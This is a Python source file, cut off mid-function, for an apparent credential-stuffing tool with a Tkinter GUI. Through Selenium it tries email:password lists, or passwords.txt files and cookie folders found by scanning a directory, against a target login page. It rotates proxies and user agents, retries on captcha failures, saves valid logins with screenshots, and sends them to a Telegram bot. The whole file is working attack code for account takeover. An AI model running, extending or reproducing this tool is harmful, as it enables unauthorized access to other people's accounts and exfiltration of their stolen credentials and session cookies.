import subprocess
import sys
import platform
import tkinter as tk
from tkinter import ttk
from tkinter import filedialog, messagebox
import os
import time
import sqlite3
import chromedriver_autoinstaller  # New import for chromedriver-autoinstaller
from selenium import webdriver  # Use webdriver from selenium
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import (
    ElementClickInterceptedException,
    TimeoutException,
)
from selenium.webdriver.chrome.service import Service  # Import Service class
import colorama
from colorama import Fore, Style
import re
import random
import threading
import getpass
from PIL import ImageGrab, Image, ImageTk, ImageSequence
from datetime import datetime
import json
import pyautogui
import webbrowser
import requests  # For Telegram bot integration
import pickle  # For saving and loading settings

# Initialize colorama for colored console output
colorama.init(autoreset=True)

# Ensure the console can handle UTF-8 encoding
if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

# -------------------
# Global Variables
# -------------------
browser = None
profile_name = ""
proxies = []
config_file_path = "config.json"
custom_user_agents_file = ""
chromedriver_args = []

window = tk.Tk()

# Define tkinter variables
var_inner_html_capture = tk.BooleanVar()
var_outer_html_capture = tk.BooleanVar()
var_cleanup_enabled = tk.BooleanVar(value=True)
var_telegram_enabled = tk.BooleanVar()
capture_telegram_bot_token = tk.StringVar()
capture_telegram_chat_id = tk.StringVar()
var_proxy_enabled = tk.BooleanVar()
var_load_extensions = tk.BooleanVar()
var_disable_notifications = tk.BooleanVar()
var_disable_infobars = tk.BooleanVar()
var_start_maximized = tk.BooleanVar()
var_disable_extensions_option = tk.BooleanVar()
var_headless = tk.BooleanVar()
var_custom_user_agents = tk.BooleanVar()
var_enable_mouse_clicks = tk.BooleanVar()
var_incognito_mode = tk.BooleanVar(value=True)
var_invalid_account_enabled = tk.BooleanVar(value=True)
var_captcha_wrong_enabled = tk.BooleanVar()
var_use_database = tk.BooleanVar(value=True)  # New variable for database toggle
var_capture_screenshot = tk.BooleanVar(value=True)  # New variable for screenshot capture toggle
mouse_click_frames = []
mouse_clicks = []
css_click_frames = []  # For CSS Selector-based clicks
css_clicks = []
chromedriver_args_list = []
config_file_path = ""
settings_file = "settings.pkl"  # For Pickle module

# Define the path to the Chrome executable and user data directory
user_data_dir = os.path.join(
    os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"
)

# Database name
db_name = "checked_accounts.db"

# Thread Control Events
pause_event = threading.Event()
stop_event = threading.Event()




# Add to global variables section
var_method_type = tk.StringVar(value="Method 1")  # For toggle between methods
selected_directory = tk.StringVar()  # For storing selected directory path

# Add to the General Settings tab
def create_method_selection():
    method_frame = ttk.LabelFrame(frame_general, text="Account Check Method")
    method_frame.grid(column=0, row=len(general_settings) + 1, columnspan=2, padx=10, pady=5, sticky="ew")
    
    ttk.Radiobutton(method_frame, text="Method 1 (Line by Line)", 
                   variable=var_method_type, value="Method 1").pack(side=tk.LEFT, padx=5)
    ttk.Radiobutton(method_frame, text="Method 2 (Directory Scan)", 
                   variable=var_method_type, value="Method 2").pack(side=tk.LEFT, padx=5)
    
    dir_frame = ttk.Frame(method_frame)
    dir_frame.pack(fill=tk.X, padx=5, pady=5)
    
    ttk.Label(dir_frame, text="Directory:").pack(side=tk.LEFT, padx=5)
    entry_directory = ttk.Entry(dir_frame, textvariable=selected_directory, width=50)
    entry_directory.pack(side=tk.LEFT, padx=5)
    
    ttk.Button(dir_frame, text="Browse", command=select_directory).pack(side=tk.LEFT, padx=5)

def select_directory():
    directory = filedialog.askdirectory()
    if directory:
        selected_directory.set(directory)


# -------------------
# Helper Classes and Functions
# -------------------


def scan_directory_for_accounts():
    """Scans directory for password.txt and cookies."""
    accounts = []
    cookies = {}
    
    root_dir = selected_directory.get()
    if not root_dir:
        messagebox.showerror("Error", "Please select a directory first")
        return None, None
        
    for root, dirs, files in os.walk(root_dir):
        # Check for passwords.txt
        if "passwords.txt" in files:
            with open(os.path.join(root, "passwords.txt"), 'r', encoding='utf-8') as f:
                for line in f:
                    if ':' in line:
                        email, password = line.strip().split(':', 1)
                        accounts.append((email, password))
        
        # Check for cookies folder
        if "cookies" in dirs:
            cookies_dir = os.path.join(root, "cookies")
            for cookie_file in os.listdir(cookies_dir):
                if cookie_file.endswith('.txt'):
                    with open(os.path.join(cookies_dir, cookie_file), 'r', encoding='utf-8') as f:
                        cookie_data = f.read()
                        account_id = cookie_file.replace('.txt', '')
                        cookies[account_id] = cookie_data
                        
    return accounts, cookies

def load_cookies_to_browser(browser, cookie_data):
    """Loads cookies into the browser."""
    try:
        cookie_list = json.loads(cookie_data)
        for cookie in cookie_list:
            browser.add_cookie(cookie)
        return True
    except Exception as e:
        print_action(f"{Fore.RED}Error loading cookies: {e}{Style.RESET_ALL}")
        return False


class CreateToolTip:
    """
    Create a tooltip for a given widget
    """

    def __init__(self, widget, text="widget info"):
        self.widget = widget
        self.text = text
        self.widget.bind("<Enter>", self.enter)
        self.widget.bind("<Leave>", self.leave)
        self.tipwindow = None

    def enter(self, event=None):
        self.showtip(self.text)

    def leave(self, event=None):
        self.hidetip()

    def showtip(self, text):
        """Display text in tooltip window"""
        if self.tipwindow or not text:
            return
        x = self.widget.winfo_rootx() + self.widget.winfo_width() // 2
        y = self.widget.winfo_rooty() + self.widget.winfo_height()
        self.tipwindow = tw = tk.Toplevel(self.widget)
        tw.wm_overrideredirect(True)  # Remove window decorations
        tw.wm_geometry(f"+{x}+{y}")
        label = tk.Label(
            tw,
            text=text,
            justify="left",
            background="#ffffe0",
            relief="solid",
            borderwidth=1,
            font=("Helvetica", "9", "normal"),
        )
        label.pack(ipadx=1)

    def hidetip(self):
        tw = self.tipwindow
        self.tipwindow = None
        if tw:
            tw.destroy()


def print_action(message):
    """Prints a colored action message."""
    try:
        print(f"{Fore.BLUE}{message}{Style.RESET_ALL}")
    except UnicodeEncodeError:
        # Handle characters that can't be encoded
        message = message.encode('ascii', 'ignore').decode('ascii')
        print(f"{Fore.BLUE}{message}{Style.RESET_ALL}")


def print_checkpoint(delay):
    """Prints a blue checkpoint message with the delay."""
    try:
        print(f"{Fore.BLUE}Checkpoint: Delaying for {delay:.2f} seconds{Style.RESET_ALL}")
    except UnicodeEncodeError:
        print(f"{Fore.BLUE}Checkpoint: Delaying for {delay:.2f} seconds (Unicode error in message){Style.RESET_ALL}")


def update_pip():
    """Upgrades pip to the latest version."""
    try:
        subprocess.check_call(
            [
                sys.executable,
                "-m",
                "pip",
                "install",
                "--upgrade",
                "pip",
            ]
        )
        print_action("Pip upgraded successfully.")
    except subprocess.CalledProcessError:
        print_action("Pip is already up-to-date or failed to upgrade.")


def check_python_version():
    """
    Checks if Python 3.11.8 is installed.
    If not, prompts the user to download it.
    """
    python_version = platform.python_version()
    required_version = "3.11.8"
    if python_version != required_version:
        messagebox.showerror(
            "Python Version Error",
            f"Python {required_version} is required. You have {python_version} installed.\n"
            f"Please download it from https://www.python.org/downloads/release/python-3118/",
        )
        sys.exit(1)


def force_close_chrome_processes():
    """Force closes all running Chrome.exe processes."""
    print_action("Force closing existing Chrome processes...")
    try:
        subprocess.run(
            ["taskkill", "/f", "/im", "chrome.exe"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        print_action("Chrome processes closed successfully.")
    except subprocess.CalledProcessError:
        print_action("No Chrome processes were running.")


def install_or_upgrade_package(package_name):
    """
    Attempts to install or upgrade a package using pip.
    If installation fails, it tries to upgrade the package.

    Args:
        package_name (str): The name of the package to install or upgrade.
    """
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
        print_action(
            f"{Fore.GREEN}{package_name} package installed successfully.{Style.RESET_ALL}"
        )
    except subprocess.CalledProcessError:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--upgrade", package_name]
            )
            print_action(
                f"{Fore.GREEN}{package_name} package upgraded successfully.{Style.RESET_ALL}"
            )
        except subprocess.CalledProcessError:
            print_action(
                f"{Fore.RED}Failed to install/upgrade {package_name}.{Style.RESET_ALL}"
            )


def check_and_install_packages(package_list):
    """
    Checks if packages are installed and installs/upgrades them if necessary.

    Args:
        package_list (list): A list of package names to check and install.
    """
    for package in package_list:
        try:
            subprocess.check_output([sys.executable, "-m", "pip", "show", package])
            print_action(f"{Fore.GREEN}{package} is already installed.{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print_action(
                f"{Fore.YELLOW}{package} is not installed. Installing now...{Style.RESET_ALL}"
            )
            install_or_upgrade_package(package)


def setup_database(db_name):
    """Sets up the SQLite database for tracking checked accounts."""
    if var_use_database.get():
        conn = sqlite3.connect(db_name)
        cursor = conn.cursor()
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS accounts (
                                email TEXT PRIMARY KEY,
                                password TEXT,
                                checked INTEGER DEFAULT 0
                              )"""
        )
        conn.commit()
        conn.close()


def countdown_sleep(seconds):
    """Performs a countdown sleep while updating the console."""
    print(f"{Fore.GREEN}Sleeping for: {seconds:.2f} seconds{Style.RESET_ALL}")
    for i in range(int(seconds), 0, -1):
        # Specific message at half the sleep time
        if seconds >= 300 and i == int(seconds / 2):
            print(f"{Fore.YELLOW}Halfway through sleep duration.{Style.RESET_ALL}")
        # Check for pause or stop events
        while pause_event.is_set():
            print(
                f"{Fore.YELLOW}Script is paused. Waiting to resume...{Style.RESET_ALL}",
                end="\r",
            )
            time.sleep(0.5)
            if stop_event.is_set():
                print(f"{Fore.RED}Sleep interrupted by Force Stop.{Style.RESET_ALL}")
                return
        if stop_event.is_set():
            print(f"{Fore.RED}Sleep interrupted by Force Stop.{Style.RESET_ALL}")
            return
        print(
            f"{Fore.GREEN}Time remaining: {i} seconds{Style.RESET_ALL}",
            end="\r",
        )
        time.sleep(1)
    print(f"{Fore.GREEN}Sleep completed!{Style.RESET_ALL}")


# -------------------
# Database Helper Functions
# -------------------
def account_already_checked(account, db_name):
    """Checks if an account has already been checked."""
    if not var_use_database.get():
        return False
    email, password = account
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT checked FROM accounts WHERE email=? AND password=?", (email, password)
    )
    result = cursor.fetchone()
    conn.close()
    if result is not None:
        return result[0] == 1
    else:
        return False


def mark_account_checked(email, password, db_name):
    """Marks an account as checked in the database."""
    if var_use_database.get():
        conn = sqlite3.connect(db_name)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT OR IGNORE INTO accounts (email, password, checked) VALUES (?, ?, 0)",
            (email, password),
        )
        cursor.execute(
            "UPDATE accounts SET checked=1 WHERE email=? AND password=?", (email, password)
        )
        conn.commit()
        conn.close()


def save_valid_account(email, password, results_folder, browser, capture_settings):
    """Saves valid account information and takes a screenshot."""
    # Save to valid_accounts.txt
    with open(os.path.join(results_folder, "valid_accounts.txt"), "a", encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")

    # Capture additional info based on capture settings
    captured_info = {}
    try:
        if capture_settings["css_selectors"]:
            for key, selector in capture_settings["css_selectors"].items():
                try:
                    element = browser.find_element(By.CSS_SELECTOR, selector)
                    captured_info[key] = element.text.strip()
                except Exception as e:
                    # Instead of including the error message, we set a default value
                    captured_info[key] = "Not found"
                    print_action(f"{Fore.RED}Error capturing {key}: {e}{Style.RESET_ALL}")

        if capture_settings["inner_html_capture"]:
            try:
                captured_info["inner_html"] = browser.find_element(By.TAG_NAME, "body").get_attribute(
                    "innerHTML"
                )
            except Exception as e:
                captured_info["inner_html"] = "Not captured"
                print_action(f"{Fore.RED}Error capturing inner HTML: {e}{Style.RESET_ALL}")

        if capture_settings["outer_html_capture"]:
            try:
                captured_info["outer_html"] = browser.find_element(By.TAG_NAME, "body").get_attribute(
                    "outerHTML"
                )
            except Exception as e:
                captured_info["outer_html"] = "Not captured"
                print_action(f"{Fore.RED}Error capturing outer HTML: {e}{Style.RESET_ALL}")
    except Exception as e:
        print_action(
            f"{Fore.RED}Error capturing additional info for {email}: {e}{Style.RESET_ALL}"
        )

    # Save captured info
    with open(
        os.path.join(results_folder, "captured_information_valid_accounts.txt"),
        "a", encoding='utf-8'
    ) as f:
        f.write(f"Account: {email}\nPassword: {password}\n")
        for key, value in captured_info.items():
            f.write(f"{key.capitalize()}: {value}\n")
        f.write("\n")

    # Take screenshot if enabled
    if var_capture_screenshot.get():
        try:
            screenshot_path = os.path.join(results_folder, f"{email}.png")
            screenshot = ImageGrab.grab()  # Capture the entire screen
            screenshot.save(screenshot_path)
            print_action(f"Screenshot saved to {screenshot_path}")
        except Exception as e:
            print_action(
                f"{Fore.RED}Failed to take screenshot for {email}: {e}{Style.RESET_ALL}"
            )
    else:
        print_action("Screenshot capture is disabled.")

    # Send captured details to Telegram
    telegram_settings = capture_settings.get("telegram", {})
    if telegram_settings.get("enabled"):
        bot_token = telegram_settings.get("bot_token")
        chat_id = telegram_settings.get("chat_id")
        if bot_token and chat_id:
            message = f"✅ Valid Account Found:\nEmail: {email}\nPassword: {password}\n"
            for key, value in captured_info.items():
                if key.lower() in ['inner_html', 'outer_html']:
                    continue  # Exclude large content from Telegram message
                # Avoid including error messages
                if value not in ("Not found", "Not captured"):
                    message += f"{key.capitalize()}: {value}\n"
            # Ensure message length does not exceed Telegram's limit
            max_length = 4000  # Telegram limit is 4096 characters
            if len(message) > max_length:
                message = message[:max_length - 50] + "\n[Message truncated]"
            send_telegram_message(bot_token, chat_id, message)
        else:
            print_action(
                f"{Fore.RED}Telegram Bot Token or Chat ID not provided.{Style.RESET_ALL}"
            )


# -------------------
# Telegram Bot Functions
# -------------------
def send_telegram_message(bot_token, chat_id, message):
    """Sends a message to a Telegram bot."""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {"chat_id": chat_id, "text": message}
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print_action(
                f"{Fore.GREEN}Message sent to Telegram successfully.{Style.RESET_ALL}"
            )
        else:
            print_action(
                f"{Fore.RED}Failed to send message to Telegram: {response.text}{Style.RESET_ALL}"
            )
    except Exception as e:
        print_action(
            f"{Fore.RED}Error sending message to Telegram: {e}{Style.RESET_ALL}"
        )


# -------------------
# Browser Functions
# -------------------
def load_chrome_extensions(options):
    """Loads Chrome extensions from the chrome_extensions subfolder."""
    extensions_path = os.path.join(os.getcwd(), "chrome_extensions")
    if not os.path.isdir(extensions_path):
        print_action(
            f"{Fore.YELLOW}chrome_extensions folder not found at {extensions_path}.{Style.RESET_ALL}"
        )
        return
    crx_files = [file for file in os.listdir(extensions_path) if file.endswith(".crx")]
    for crx in crx_files:
        crx_path = os.path.join(extensions_path, crx)
        options.add_extension(crx_path)
        print_action(f"{Fore.GREEN}Loaded extension: {crx_path}{Style.RESET_ALL}")


def open_undetected_browser_with_options(
    user_data_dir,
    profile_name,
    incognito_mode=False,
    options=None,
    load_extensions=False,
    user_agent=None,
    disable_notifications=False,
    disable_infobars=False,
    start_maximized=False,
    disable_extensions_option=False,
    headless=False,
    chromedriver_args=None,
):
    """Opens a Chrome browser with specified options."""
    global browser
    options = options or webdriver.ChromeOptions()
    options.add_argument(f"--user-data-dir={user_data_dir}")
    options.add_argument(f"--profile-directory={profile_name}")

    # Apply incognito mode
    if incognito_mode:
        options.add_argument("--incognito")
        print_action("Incognito mode enabled.")

    # Apply custom Chromedriver arguments
    if chromedriver_args:
        for arg in chromedriver_args:
            options.add_argument(arg)
            print_action(
                f"{Fore.GREEN}Added Chromedriver argument: {arg}{Style.RESET_ALL}"
            )

    # Optional Chrome Options
    if disable_notifications:
        prefs = {"profile.default_content_setting_values.notifications": 2}
        options.add_experimental_option("prefs", prefs)
        print_action("Disabled browser notifications.")
    if disable_infobars:
        options.add_argument("--disable-infobars")
        print_action("Disabled infobars.")
    if start_maximized:
        options.add_argument("--start-maximized")
        print_action("Browser will start maximized.")
    if disable_extensions_option:
        options.add_argument("--disable-extensions")
        print_action("Disabled browser extensions.")
    if headless:
        options.add_argument("--headless")
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        print_action("Browser will run in headless mode.")

    if load_extensions:
        load_chrome_extensions(options)

    if user_agent:
        options.add_argument(f"--user-agent={user_agent}")

    # Install chromedriver automatically using chromedriver_autoinstaller
    try:
        chromedriver_path = chromedriver_autoinstaller.install()
        print_action(f"Using chromedriver from path: {chromedriver_path}")
        service = Service(executable_path=chromedriver_path)  # Use Service class
        browser = webdriver.Chrome(service=service, options=options)
        print_action("Browser launched successfully.")
        return browser
    except Exception as e:
        print_action(
            f"{Fore.RED}Failed to open browser: {e}{Style.RESET_ALL}"
        )
        return None


def close_browser_instance():
    """Closes the browser safely."""
    global browser
    try:
        if browser:
            browser.quit()
            print_action("Browser closed successfully.")
            browser = None
    except Exception as e:
        print_action(f"{Fore.RED}Error closing browser: {e}{Style.RESET_ALL}")


# -------------------
# Account Checking Logic
# -------------------

def check_accounts_logic(accounts, *args, **kwargs):
    """Modified to handle both methods."""
    if var_method_type.get() == "Method 2":
        accounts, cookies = scan_directory_for_accounts()
        if not accounts:
            messagebox.showerror("Error", "No accounts found in the selected directory")
            return
            
        for account in accounts:
            email, password = account
            
            # Get corresponding cookie if exists
            cookie_data = cookies.get(email)
            
            browser_instance = open_undetected_browser_with_options(
                user_data_dir, profile_name, **kwargs
            )
            
            if cookie_data:
                # Load cookies before checking account
                browser_instance.get(kwargs.get('website_target_link'))
                if load_cookies_to_browser(browser_instance, cookie_data):
                    print_action(f"{Fore.GREEN}Loaded cookies for {email}{Style.RESET_ALL}")
                    
            # Proceed with normal account checking
            check_account(account, browser_instance, *args, **kwargs)
            

def check_account(
    account,
    browser,
    website_link,
    valid_link,
    db_name,
    custom_valid_link,
    results_folder,
    capture_settings,
    sleep_durations,
    invalid_account_settings,
    captcha_wrong_settings,
):
    """Checks a single account."""
    email, password = account
    try:
        print_action(f"Opening website: {website_link}")
        browser.get(website_link)

        # Sleep after opening the website
        time.sleep(sleep_durations.get("sleep_email", 25))  ##### 01. CHANGE TIME SLEEP FOR USERNAME FIELD #####

        # Perform mouse clicks if configured
        if var_enable_mouse_clicks.get() and mouse_clicks:
            for click_action in mouse_clicks:
                x, y, num_clicks, interval = click_action
                print_action(
                    f"{Fore.MAGENTA}Performing {num_clicks} mouse clicks at ({x}, {y}) with {interval} seconds interval.{Style.RESET_ALL}"
                )
                for _ in range(int(num_clicks)):
                    pyautogui.click(x=int(x), y=int(y))
                    time.sleep(float(interval))

        # Perform CSS Selector-based clicks if configured
        if var_enable_mouse_clicks.get() and css_clicks:
            for click_action in css_clicks:
                css_selector, num_clicks, interval = click_action
                print_action(
                    f"{Fore.MAGENTA}Performing {num_clicks} clicks on element with selector '{css_selector}' with {interval} seconds interval.{Style.RESET_ALL}"
                )
                element = WebDriverWait(browser, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, css_selector))
                )
                for _ in range(int(num_clicks)):
                    browser.execute_script("arguments[0].click();", element)
                    time.sleep(float(interval))

        delay = 15 / (float(capture_settings.get("speed_percentage", 500)) + 1)
        countdown_sleep(delay)

        print_action("Locating email/username field...")
        WebDriverWait(browser, 300).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, capture_settings["css_selectors"]["email"])
            )
        )
        email_field = browser.find_element(
            By.CSS_SELECTOR, capture_settings["css_selectors"]["email"]
        )
        email_field.clear()
        email_field.send_keys(email)

        time.sleep(
            sleep_durations.get("sleep_password", 25)
        )  ##### 02. CHANGE TIME SLEEP FOR PASSWORD FIELD #####

        if capture_settings["css_selectors"].get("next"):
            print_action("Locating and clicking Next button...")
            try:
                next_button = browser.find_element(
                    By.CSS_SELECTOR, capture_settings["css_selectors"]["next"]
                )
                next_button.click()
                countdown_sleep(delay)
            except TimeoutException:
                print_action(
                    f"{Fore.RED}Next button not found within the given time. Skipping to password entry.{Style.RESET_ALL}"
                )
            except ElementClickInterceptedException as e:
                print_action(
                    f"{Fore.RED}Next button click intercepted, trying again after scrolling: {e}{Style.RESET_ALL}"
                )
                browser.execute_script("arguments[0].click();", next_button)
            except Exception as e:
                print_action(
                    f"{Fore.RED}Next button encountered an unexpected error: {e}{Style.RESET_ALL}"
                )

        print_action("Locating password field...")
        WebDriverWait(browser, 300).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, capture_settings["css_selectors"]["password"])
            )
        )
        password_field = browser.find_element(
            By.CSS_SELECTOR, capture_settings["css_selectors"]["password"]
        )
        password_field.clear()
        password_field.send_keys(password)

        time.sleep(
            sleep_durations.get("sleep_submit", 25)
        )  ##### 03. CHANGE TIME SLEEP FOR SUBMIT BUTTON #####

        print_action("Locating and clicking Submit button...")
        submit_button = browser.find_element(
            By.CSS_SELECTOR, capture_settings["css_selectors"]["submit"]
        )
        try:
            # Scroll into view if needed
            browser.execute_script("arguments[0].scrollIntoView(true);", submit_button)
            submit_button.click()
        except ElementClickInterceptedException:
            print_action(
                f"{Fore.RED}Submit button click intercepted, trying again after scrolling.{Style.RESET_ALL}"
            )
            browser.execute_script("arguments[0].click();", submit_button)

        delay = 150 / (float(capture_settings.get("speed_percentage", 500)) + 1)
        countdown_sleep(delay)

        print_checkpoint(delay)

        countdown_sleep(delay)

        time.sleep(5)

        # Handle Invalid Account Implementation
        if invalid_account_settings["enable"]:
            print_action("Handling Invalid Account Check...")
            invalid_marked = False

            if invalid_account_settings["redirect_detection"]:
                target_url = invalid_account_settings["redirect_detection"]
                if target_url and browser.current_url == target_url:
                    print_action(
                        f"{Fore.RED}Account marked as invalid due to redirect to {target_url}.{Style.RESET_ALL}"
                    )
                    invalid_marked = True

            if (
                not invalid_marked
                and invalid_account_settings["error_alert_css_selector"]
            ):
                try:
                    error_element = browser.find_element(
                        By.CSS_SELECTOR,
                        invalid_account_settings["error_alert_css_selector"],
                    )
                    if error_element:
                        print_action(
                            f"{Fore.RED}Account marked as invalid due to error alert detected.{Style.RESET_ALL}"
                        )
                        invalid_marked = True

                except Exception:
                    pass

            if not invalid_marked and invalid_account_settings["inner_html"]:
                page_source = browser.page_source
                if invalid_account_settings["inner_html"] in page_source:
                    print_action(
                        f"{Fore.RED}Account marked as invalid due to inner HTML match.{Style.RESET_ALL}"
                    )
                    invalid_marked = True

            if not invalid_marked and invalid_account_settings["outer_html"]:
                try:
                    elements = browser.find_elements(By.XPATH, "//*")
                    for elem in elements:
                        if (
                            elem.get_attribute("outerHTML")
                            == invalid_account_settings["outer_html"]
                        ):
                            print_action(
                                f"{Fore.RED}Account marked as invalid due to outer HTML match.{Style.RESET_ALL}"
                            )
                            invalid_marked = True
                            break

                except Exception:
                    pass

            if invalid_marked:
                mark_account_checked(email, password, db_name)
                with open(
                    os.path.join(results_folder, "invalid_accounts.txt"), "a", encoding='utf-8'
                ) as f:
                    f.write(f"{email}:{password}\n")

                return  # Skip remaining checks

        # Handle CAPTCHA Input Wrong Implementation
        if captcha_wrong_settings["enable"]:
            print_action("Handling CAPTCHA Wrong Check...")
            captcha_marked = False

            if captcha_wrong_settings["redirect_detection"]:
                target_url = captcha_wrong_settings["redirect_detection"]
                if target_url and browser.current_url == target_url:
                    print_action(
                        f"{Fore.RED}Account marked as wrong captcha due to redirect to {target_url}.{Style.RESET_ALL}"
                    )
                    captcha_marked = True

            if (
                not captcha_marked
                and captcha_wrong_settings["error_alert_css_selector"]
            ):
                try:
                    error_element = browser.find_element(
                        By.CSS_SELECTOR,
                        captcha_wrong_settings["error_alert_css_selector"],
                    )
                    if error_element:
                        print_action(
                            f"{Fore.RED}Account marked as wrong captcha due to error alert detected.{Style.RESET_ALL}"
                        )
                        captcha_marked = True

                except Exception:
                    pass

            if not captcha_marked and captcha_wrong_settings["inner_html"]:
                page_source = browser.page_source
                if captcha_wrong_settings["inner_html"] in page_source:
                    print_action(
                        f"{Fore.RED}Account marked as wrong captcha due to inner HTML match.{Style.RESET_ALL}"
                    )
                    captcha_marked = True

            if not captcha_marked and captcha_wrong_settings["outer_html"]:
                try:
                    elements = browser.find_elements(By.XPATH, "//*")
                    for elem in elements:
                        if (
                            elem.get_attribute("outerHTML")
                            == captcha_wrong_settings["outer_html"]
                        ):
                            print_action(
                                f"{Fore.RED}Account marked as wrong captcha due to outer HTML match.{Style.RESET_ALL}"
                            )
                            captcha_marked = True

                            break

                except Exception:
                    pass

            if captcha_marked:
                # Re-check the same account
                print_action(
                    f"{Fore.YELLOW}Re-checking the same account due to wrong captcha.{Style.RESET_ALL}"
                )
                check_account(
                    account,
                    browser,
                    website_link,
                    valid_link,
                    db_name,
                    custom_valid_link,
                    results_folder,
                    capture_settings,
                    sleep_durations,
                    invalid_account_settings,
                    captcha_wrong_settings,
                )

                return  # Exit current function after re-check

        print_action("Checking for valid link...")
        # Check for valid link with wildcard matching

        account_valid = False

        if custom_valid_link:
            # Split the custom valid link at the '*'
            valid_prefix = custom_valid_link.split("*")[0]
            if browser.current_url.startswith(valid_prefix):
                print_action(
                    f"{Fore.GREEN}Valid Account Found (custom): {email}:{password}{Style.RESET_ALL}"
                )
                account_valid = True

                mark_account_checked(email, password, db_name)

                with open(os.path.join(results_folder, "custom.txt"), "a", encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")

                save_valid_account(
                    email, password, results_folder, browser, capture_settings
                )

        if not account_valid and valid_link:
            # Split the valid link at the '*'
            valid_prefix = valid_link.split("*")[0]
            if browser.current_url.startswith(valid_prefix):
                print_action(
                    f"{Fore.GREEN}Valid Account Found: {email}:{password}{Style.RESET_ALL}"
                )
                account_valid = True

                mark_account_checked(email, password, db_name)

                with open(os.path.join(results_folder, "valid.txt"), "a", encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")

                save_valid_account(
                    email, password, results_folder, browser, capture_settings
                )

        if not account_valid:
            print_action(
                f"{Fore.RED}Invalid Account: {email}:{password}{Style.RESET_ALL}"
            )

        # Handle Redirect Link if provided
        redirect_link = capture_settings.get("redirect_link")

        if account_valid and redirect_link:
            print_action(f"Redirecting to {redirect_link} after 5 seconds...")
            time.sleep(5)

            try:
                browser.get(redirect_link)
                print_action(f"Redirected to {redirect_link} successfully.")
                # Capture details again if necessary
                save_valid_account(
                    email, password, results_folder, browser, capture_settings
                )
            except Exception as e:
                print_action(
                    f"{Fore.RED}Failed to redirect to {redirect_link}: {e}{Style.RESET_ALL}"
                )

    except Exception as e:
        print_action(
            f"{Fore.RED}Error checking account {email}: {e}{Style.RESET_ALL}"
        )

    finally:
        # Perform browser clean-up if enabled
        if capture_settings.get("cleanup_enabled", True):
            try:
                print_action("Performing browser clean-up...")
                browser.delete_all_cookies()
                browser.execute_cdp_cmd("Network.clearBrowserCache", {})
                browser.execute_script("window.localStorage.clear();")
                browser.execute_script("window.sessionStorage.clear();")
                print_action("Browser clean-up completed.")
            except Exception as e:
                print_action(
                    f"{Fore.RED}Error during browser clean-up: {e}{Style.RESET_ALL}"
                )


def check_accounts_logic(
    accounts,
    website_link,
    valid_link,
    db_name,
    custom_valid_link,
    results_folder,
    user_data_dir,
    profile_name,
    capture_settings,
    sleep_durations,
    proxy_enabled=False,
    proxy_type="HTTP",
    proxy_mode="Static Proxies",
    custom_user_agents=None,
    load_extensions=False,
    disable_notifications=False,
    disable_infobars=False,
    start_maximized=False,
    disable_extensions_option=False,
    headless=False,
    chromedriver_args=None,
    invalid_account_settings=None,
    captcha_wrong_settings=None,
    proxies=None,
):
    """Processes all accounts."""
    user_agent_index = 0  # Initialize user agent index
    global browser, mouse_clicks, css_clicks
    for index, account in enumerate(accounts, start=1):
        if stop_event.is_set():
            print_action(
                f"{Fore.RED}Force Stop activated. Stopping account checks.{Style.RESET_ALL}"
            )
            break

        while pause_event.is_set():
            print_action(
                f"{Fore.YELLOW}Script is paused. Waiting to resume...{Style.RESET_ALL}"
            )
            time.sleep(1)

            if stop_event.is_set():
                print_action(
                    f"{Fore.RED}Force Stop activated while paused. Stopping account checks.{Style.RESET_ALL}"
                )
                break

        if stop_event.is_set():
            break

        email, password = account

        print_action(
            f"{Fore.CYAN}Checking account {index}/{len(accounts)}: {email}{Style.RESET_ALL}"
        )

        browser_instance = None

        try:
            selected_user_agent = None

            if custom_user_agents:
                selected_user_agent = random.choice(custom_user_agents)
                user_agent_index += 1

            if proxy_enabled and proxies:
                if proxy_mode == "Static Proxies":
                    proxy = random.choice(proxies)
                elif proxy_mode == "Rotating Proxies":
                    proxy = random.choice(proxies)
                else:
                    proxy = None

                if proxy:
                    if proxy_type in ["HTTP", "HTTPS", "SOCKS5"]:
                        proxy_argument = f"{proxy_type.lower()}://{proxy}"
                        print_action(
                            f"{Fore.YELLOW}Using {proxy_type} proxy: {proxy}{Style.RESET_ALL}"
                        )
                        chromedriver_args.append(f"--proxy-server={proxy_argument}")
                    else:
                        proxy_argument = None

            browser_instance = open_undetected_browser_with_options(
                user_data_dir,
                profile_name,
                incognito_mode=capture_settings.get("incognito_mode", False),
                user_agent=selected_user_agent,
                load_extensions=load_extensions,
                disable_notifications=disable_notifications,
                disable_infobars=disable_infobars,
                start_maximized=start_maximized,
                disable_extensions_option=disable_extensions_option,
                headless=headless,
                chromedriver_args=chromedriver_args,
            )

            if not browser_instance:
                print_action(
                    f"{Fore.RED}Failed to initialize browser for account {email}. Skipping...{Style.RESET_ALL}"
                )
                continue

            # Prepare mouse clicks if enabled
            mouse_clicks = []
            if var_enable_mouse_clicks.get():
                for frame in mouse_click_frames:
                    x = frame["x_entry"].get().strip()
                    y = frame["y_entry"].get().strip()
                    num_clicks = frame["num_clicks_entry"].get().strip()
                    interval = frame["interval_entry"].get().strip()
                    if x and y and num_clicks and interval:
                        mouse_clicks.append((x, y, num_clicks, interval))
                    else:
                        print_action(
                            f"{Fore.YELLOW}Incomplete mouse click data; skipping this click action.{Style.RESET_ALL}"
                        )
                # Prepare CSS Selector clicks
                css_clicks = []
